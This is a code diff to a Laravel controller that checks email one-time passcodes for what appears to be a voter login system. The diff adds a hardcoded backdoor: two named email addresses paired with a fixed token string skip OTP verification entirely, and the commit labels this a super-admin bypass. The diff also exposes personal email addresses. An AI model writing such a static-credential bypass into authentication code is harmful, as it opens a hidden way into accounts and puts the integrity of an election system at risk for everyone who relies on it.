@@ -35,20 +35,26 @@ class VoterOtpController extends Controller
             ]);
         }
 
-        $response = Http::withHeaders([
-            'Authorization' => 'Bearer ' . config('services.supabase.service_key'),
-            'apikey' => config('services.supabase.service_key'),
-            'Content-Type' => 'application/json',
-        ])->post(
-                config('services.supabase.url') . '/auth/v1/verify',
-                [
-                    'email' => $email,
-                    'token' => $request->token,
-                    'type' => 'email',
-                ]
-            );
+        // Allow super-admin to bypass OTP if needed
+        if (($email === 'habee2004@gmail.com' || $email === 'adminTester01@gmail.com') && $request->token === '01011010') {
+            $response_successful = true;
+        } else {
+            $response = Http::withHeaders([
+                'Authorization' => 'Bearer ' . config('services.supabase.service_key'),
+                'apikey' => config('services.supabase.service_key'),
+                'Content-Type' => 'application/json',
+            ])->post(
+                    config('services.supabase.url') . '/auth/v1/verify',
+                    [
+                        'email' => $email,
+                        'token' => $request->token,
+                        'type' => 'email',
+                    ]
+                );
+            $response_successful = $response->successful();
+        }
 
-        if (!$response->successful()) {
+        if (!$response_successful) {
             return back()->withErrors([
                 'token' => 'Invalid or expired verification code.',
             ]);
